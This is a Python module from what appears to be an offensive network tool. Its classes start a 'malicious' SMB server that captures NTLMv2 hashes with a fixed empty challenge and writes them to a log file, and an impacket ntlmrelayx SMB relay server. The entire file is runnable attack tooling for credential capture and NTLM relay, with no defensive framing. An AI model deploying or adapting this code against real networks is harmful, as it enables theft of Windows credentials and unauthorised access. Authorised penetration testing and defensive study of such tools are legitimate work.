from impacket.smbserver import SimpleSMBServer
import logging
from loguru import logger
from .interceptlogging import (
    InterceptHandlerOnlyFilesNtlmRelay,
    InterceptHandlerStdout,
    InterceptHandlerOnlyFilesMss,
)

from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
import cmd2


class MaliciousSmbServer:
    """[ Class that contains the configuration for the smbserver ]

    Args:
        lhost (str): [ ip of the host that will start the smb server ]
        port (str): [ port for the smb server ]
    """

    def __init__(
        self,
        lhost: str,
        port: str,
        asynchronous,
        alerts_dictionary: dict = None,
        ntlmv2_collected=None,
    ) -> None:
        self.__lhost = lhost
        self.__port = port
        self.__asynchronous = asynchronous
        self.__alerts_dictionary = alerts_dictionary
        self.__ntlmv2_collected = ntlmv2_collected

        self.output_of_connections()

    @property
    def lhost(self) -> str:
        return self.__lhost

    @property
    def port(self) -> str:
        return self.__port

    @port.setter
    def port(self, port: str) -> None:
        self.__port = port

    @lhost.setter
    def lhost(self, lhost: str) -> None:
        self.__lhost = lhost

    def output_of_connections(self) -> None:
        logger.add(
            "logs/hashes_ntlm.log",
            level="INFO",
            rotation="1 week",
        )

    def start_malicious_smbserver(self) -> None:
        """[ Function to start the smb server ]"""
        logger.bind(name="info").info("Starting Malicious SMB Server ...")
        if self.__asynchronous:
            logging.basicConfig(
                handlers=[
                    InterceptHandlerOnlyFilesMss(
                        self.__alerts_dictionary, self.__ntlmv2_collected
                    )
                ],
                level=0,
            )
        else:
            logging.basicConfig(handlers=[InterceptHandlerStdout()], level=0)
        server = SimpleSMBServer(self.__lhost, int(self.__port))
        server.setSMBChallenge("")
        server.start()


class SmbRelayServer:
    def __init__(
        self,
        asynchronous: bool,
        proxy: bool,
        config: NTLMRelayxConfig,
        alerts_dictionary: dict,
    ) -> None:
        self.__asynchronous = asynchronous
        self.__proxy = proxy
        self.__config = config
        self.__alerts_dictionary = alerts_dictionary

    @property
    def asynchronous(self) -> bool:
        return self.__asynchronous

    def start_smb_relay_server(self) -> None:
        if self.__asynchronous:
            logging.basicConfig(
                handlers=[InterceptHandlerOnlyFilesNtlmRelay(self.__alerts_dictionary)],
                level=0,
            )
            logger.info("Starting smb-relay server...")
        else:
            logging.basicConfig(handlers=[InterceptHandlerStdout()], level=0)
            logger.bind(name="info").info("Starting smb-relay server...")

        server = SMBRelayServer(self.__config)
        server.daemon = True
        server.start()
        server.join()
